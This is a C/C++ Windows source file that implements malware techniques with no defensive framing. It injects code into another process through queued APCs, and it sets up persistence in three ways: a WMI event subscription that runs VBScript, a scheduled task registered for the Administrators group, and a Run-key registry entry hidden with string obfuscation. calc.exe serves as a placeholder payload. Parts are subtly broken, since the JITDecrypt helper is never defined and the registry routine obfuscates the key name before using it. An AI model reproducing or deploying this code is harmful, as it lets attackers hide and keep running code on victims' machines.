#include <Windows.h>
#include <TlHelp32.h>
#include <wbemidl.h>
#include <comutil.h>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "comsuppw.lib")

BOOL QueueAPCInject_x64(HANDLE hProc, PVOID remoteAddr) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    if (!Thread32First(hSnapshot, &te32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    do {
        if (te32.th32OwnerProcessID == GetProcessId(hProc)) {
            HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION | THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
            if (hThread != NULL) {
                if (QueueUserAPC((PAPCFUNC)remoteAddr, hThread, 0)) {
                    CloseHandle(hThread);
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
                CloseHandle(hThread);
            }
        }
    } while (Thread32Next(hSnapshot, &te32));

    CloseHandle(hSnapshot);
    return FALSE;
}

BOOL WMIPersistence() {
    HRESULT hres;

    // Step 1: --------------------------------------------------
    // Initialize COM. ------------------------------------------

    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        return FALSE;
    }

    // Step 2: --------------------------------------------------
    // Set general COM security levels --------------------------

    hres = CoInitializeSecurity(
        NULL,
        -1,                          // COM authentication
        NULL,                        // Authentication services
        NULL,                        // Reserved
        RPC_C_AUTHN_LEVEL_DEFAULT,   // Default authentication
        RPC_C_IMP_LEVEL_IMPERSONATE, // Default Impersonation
        NULL,                        // Authentication info
        EOAC_NONE,                   // Additional capabilities
        NULL                         // Reserved
    );

    if (FAILED(hres)) {
        CoUninitialize();
        return FALSE;
    }

    // Step 3: ---------------------------------------------------
    // Obtain the initial locator to WMI -------------------------

    IWbemLocator* pLoc = NULL;

    hres = CoCreateInstance(
        CLSID_WbemLocator,
        0,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (LPVOID*)&pLoc);

    if (FAILED(hres)) {
        CoUninitialize();
        return FALSE;
    }

    // Step 4: -----------------------------------------------------
    // Connect to WMI through the IWbemLocator::ConnectServer method

    IWbemServices* pSvc = NULL;

    hres = pLoc->ConnectServer(
        _bstr_t(L"ROOT\\CIMV2"), // Object path of WMI namespace
        NULL,                    // User name. NULL = current user
        NULL,                    // User password. NULL = current
        0,                       // Locale. NULL indicates current
        NULL,                    // Security flags.
        0,                       // Authority (e.g. Kerberos)
        0,                       // Context object
        &pSvc                    // pointer to IWbemServices proxy
    );

    if (FAILED(hres)) {
        pLoc->Release();
        CoUninitialize();
        return FALSE;
    }

    // Step 5: --------------------------------------------------
    // Set security levels on the proxy -------------------------

    hres = CoSetProxyBlanket(
        pSvc,                        // Indicates the proxy to set
        RPC_C_AUTHN_WINNT,           // RPC_C_AUTHN_xxx
        RPC_C_AUTHZ_NONE,            // RPC_C_AUTHZ_xxx
        NULL,                        // Server principal name
        RPC_C_AUTHN_LEVEL_CALL,      // RPC_C_AUTHN_LEVEL_xxx
        RPC_C_IMP_LEVEL_IMPERSONATE, // RPC_C_IMP_LEVEL_xxx
        NULL,                        // client identity
        EOAC_NONE                    // proxy capabilities
    );

    if (FAILED(hres)) {
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return FALSE;
    }

    // Step 6: --------------------------------------------------
    // Create the event filter. ---------------------------------

    IUnsecuredApartment* pUnsecApp = NULL;
    hres = CoCreateInstance(CLSID_UnsecuredApartment, NULL,
        CLSCTX_LOCAL_SERVER, IID_IUnsecuredApartment,
        (void**)&pUnsecApp);

    IWbemClassObject* pFilter = NULL;
    hres = pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pFilter, NULL);
    if (FAILED(hres)) {
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return FALSE;
    }

    IWbemClassObject* pFilterInst = NULL;
    hres = pFilter->SpawnInstance(0, &pFilterInst);
    if (FAILED(hres)) {
        pFilter->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return FALSE;
    }

    VARIANT var;
    VariantInit(&var);
    var.vt = VT_BSTR;
    var.bstrVal = _bstr_t(L"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'");
    hres = pFilterInst->Put(L"Query", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = _bstr_t(L"MyFilter");
    hres = pFilterInst->Put(L"Name", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = _bstr_t(L"__EventFilter");
    hres = pFilterInst->Put(L"__CLASS", 0, &var, 0);
    VariantClear(&var);

    hres = pSvc->PutInstance(pFilterInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hres)) {
        pFilterInst->Release();
        pFilter->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return FALSE;
    }


    // Step 7: --------------------------------------------------
    // Create the event consumer. -------------------------------

    IWbemClassObject* pConsumer = NULL;
    hres = pSvc->GetObject(_bstr_t(L"ActiveScriptEventConsumer"), 0, NULL, &pConsumer, NULL);
    if (FAILED(hres)) {
        pFilterInst->Release();
        pFilter->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return FALSE;
    }

    IWbemClassObject* pConsumerInst = NULL;
    hres = pConsumer->SpawnInstance(0, &pConsumerInst);
    if (FAILED(hres)) {
        pConsumer->Release();
        pFilterInst->Release();
        pFilter->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return FALSE;
    }

    VariantInit(&var);
    var.vt = VT_BSTR;
    var.bstrVal = _bstr_t(L"MyConsumer");
    hres = pConsumerInst->Put(L"Name", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = _bstr_t(L"VBScript");
    hres = pConsumerInst->Put(L"ScriptingEngine", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = _bstr_t("CreateObject(\"WScript.Shell\").Run \"calc.exe\"");
    hres = pConsumerInst->Put(L"ScriptText", 0, &var, 0);
    VariantClear(&var);

    hres = pSvc->PutInstance(pConsumerInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hres)) {
        pConsumerInst->Release();
        pConsumer->Release();
        pFilterInst->Release();
        pFilter->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return FALSE;
    }

    // Step 8: --------------------------------------------------
    // Create the binding. --------------------------------------

    IWbemClassObject* pBinding = NULL;
    hres = pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &pBinding, NULL);
    if (FAILED(hres)) {
        pConsumerInst->Release();
        pConsumer->Release();
        pFilterInst->Release();
        pFilter->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return FALSE;
    }

    IWbemClassObject* pBindingInst = NULL;
    hres = pBinding->SpawnInstance(0, &pBindingInst);
    if (FAILED(hres)) {
        pBinding->Release();
        pConsumerInst->Release();
        pConsumer->Release();
        pFilterInst->Release();
        pFilter->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return FALSE;
    }

    VariantInit(&var);
    var.vt = VT_BSTR;
    var.bstrVal = _bstr_t(L"__EventFilter.Name=\"MyFilter\"");
    hres = pBindingInst->Put(L"Filter", 0, &var, 0);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = _bstr_t(L"ActiveScriptEventConsumer.Name=\"MyConsumer\"");
    hres = pBindingInst->Put(L"Consumer", 0, &var, 0);
    VariantClear(&var);

    hres = pSvc->PutInstance(pBindingInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hres)) {
        pBindingInst->Release();
        pBinding->Release();
        pConsumerInst->Release();
        pConsumer->Release();
        pFilterInst->Release();
        pFilter->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return FALSE;
    }

    // Step 9: --------------------------------------------------
    // Cleanup. -------------------------------------------------

    pSvc->Release();
    pLoc->Release();
    pUnsecApp->Release();
    pFilter->Release();
    pConsumer->Release();
    pBinding->Release();
    pFilterInst->Release();
    pConsumerInst->Release();
    pBindingInst->Release();
    CoUninitialize();

    return TRUE;
}

BOOL COMScheduledTaskPersistence() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr))
    {
        printf("CoInitializeEx failed: %x", hr);
        return 1;
    }

    hr = CoInitializeSecurity(
        NULL,
        -1,
        NULL,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE,
        NULL
    );
    if (FAILED(hr))
    {
        printf("CoInitializeSecurity failed: %x", hr);
        CoUninitialize();
        return 1;
    }

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler,
        NULL,
        CLSCTX_INPROC_SERVER,
        IID_ITaskService,
        (void**)&pService);
    if (FAILED(hr))
    {
        printf("Failed to create an instance of ITaskService: %x", hr);
        CoUninitialize();
        return 1;
    }

    hr = pService->Connect(_variant_t(), _variant_t(),
        _variant_t(), _variant_t());
    if (FAILED(hr))
    {
        printf("ITaskService::Connect failed: %x", hr);
        pService->Release();
        CoUninitialize();
        return 1;
    }

    ITaskFolder* pRootFolder = NULL;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr))
    {
        printf("Cannot get Root Folder pointer: %x", hr);
        pService->Release();
        CoUninitialize();
        return 1;
    }

    LPCWSTR wszTaskName = L"Test Task";
    pRootFolder->DeleteTask(_bstr_t(wszTaskName), 0);

    ITaskDefinition* pTask = NULL;
    hr = pService->NewTask(0, &pTask);

    pService->Release();
    if (FAILED(hr))
    {
        printf("Failed to CoCreate an instance of the TaskService class: %x", hr);
        pRootFolder->Release();
        CoUninitialize();
        return 1;
    }

    IRegistrationInfo* pRegInfo = NULL;
    hr = pTask->get_RegistrationInfo(&pRegInfo);
    if (FAILED(hr))
    {
        printf("Cannot get registration info: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    hr = pRegInfo->put_Author(L"Author");
    pRegInfo->Release();
    if (FAILED(hr))
    {
        printf("Cannot put author name: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    IPrincipal* pPrincipal = NULL;
    hr = pTask->get_Principal(&pPrincipal);
    if (FAILED(hr))
    {
        printf("Cannot get principal pointer: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    hr = pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
    pPrincipal->Release();
    if (FAILED(hr))
    {
        printf("Cannot put logon type: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    ITaskSettings* pSettings = NULL;
    hr = pTask->get_Settings(&pSettings);
    if (FAILED(hr))
    {
        printf("Cannot get settings pointer: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    hr = pSettings->put_StartWhenAvailable(true);
    pSettings->Release();
    if (FAILED(hr))
    {
        printf("Cannot put setting info: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    IActionCollection* pActionCollect = NULL;
    hr = pTask->get_Actions(&pActionCollect);
    if (FAILED(hr))
    {
        printf("Cannot get Task Action collection pointer: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    IAction* pAction = NULL;
    hr = pActionCollect->Create(TASK_ACTION_EXEC, &pAction);
    pActionCollect->Release();
    if (FAILED(hr))
    {
        printf("Cannot create the action: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    IExecAction* pExecAction = NULL;
    hr = pAction->QueryInterface(
        IID_IExecAction, (void**)&pExecAction);
    pAction->Release();
    if (FAILED(hr))
    {
        printf("QueryInterface call failed for IExecAction: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    hr = pExecAction->put_Path(_bstr_t(L"C:\\Windows\\System32\\calc.exe"));
    pExecAction->Release();
    if (FAILED(hr))
    {
        printf("Cannot set path of executable: %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    IRegisteredTask* pRegisteredTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(wszTaskName),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(L"S-1-5-32-544"),
        _variant_t(),
        TASK_LOGON_GROUP,
        _variant_t(L""),
        &pRegisteredTask);
    if (FAILED(hr))
    {
        printf("Error saving the Task : %x", hr);
        pRootFolder->Release();
        pTask->Release();
        CoUninitialize();
        return 1;
    }

    printf("Success, task is created");

    pRootFolder->Release();
    pTask->Release();
    pRegisteredTask->Release();
    CoUninitialize();

    return 0;
}

BOOL EncryptedRegistryPersistence() {
    HKEY hKey;
    LONG lRes;

    // Encrypt the registry key name
    char keyName[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    JITDecrypt((BYTE*)keyName, strlen(keyName), 0x12345678);

    // Create the registry key
    lRes = RegCreateKeyExA(HKEY_CURRENT_USER, keyName, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (lRes != ERROR_SUCCESS) {
        return FALSE;
    }

    // Encrypt the value name
    char valueName[] = "MyEncryptedValue";
    JITDecrypt((BYTE*)valueName, strlen(valueName), 0x87654321);

    // Encrypt the value data
    char valueData[] = "calc.exe";
    JITDecrypt((BYTE*)valueData, strlen(valueData), 0xABCDEF12);

    // Set the registry value
    lRes = RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)valueData, strlen(valueData));
    if (lRes != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }

    RegCloseKey(hKey);

    // Decrypt the registry key name
    JITDecrypt((BYTE*)keyName, strlen(keyName), 0x12345678);

    // Open the registry key
    lRes = RegOpenKeyExA(HKEY_CURRENT_USER, keyName, 0, KEY_READ, &hKey);
    if (lRes != ERROR_SUCCESS) {
        return FALSE;
    }

    // Decrypt the value name
    JITDecrypt((BYTE*)valueName, strlen(valueName), 0x87654321);

    // Read the encrypted value
    char readValueData[256];
    DWORD dwBufferSize = sizeof(readValueData);
    lRes = RegQueryValueExA(hKey, valueName, NULL, NULL, (LPBYTE)readValueData, &dwBufferSize);
    if (lRes != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }

    // Decrypt the value data
    JITDecrypt((BYTE*)readValueData, dwBufferSize, 0xABCDEF12);

    // Execute the decrypted value
    WinExec(readValueData, SW_SHOW);

    RegCloseKey(hKey);

    return TRUE;
}
